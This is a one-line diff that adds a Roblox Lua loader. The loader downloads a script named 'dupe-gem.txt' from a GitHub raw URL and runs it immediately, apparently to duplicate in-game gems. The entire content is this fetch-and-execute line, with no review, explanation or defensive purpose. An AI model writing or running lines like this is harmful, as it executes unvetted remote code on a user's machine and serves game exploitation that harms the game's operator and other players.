@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Renzy1129/Redz99-/main/dupe-gem.txt"))()
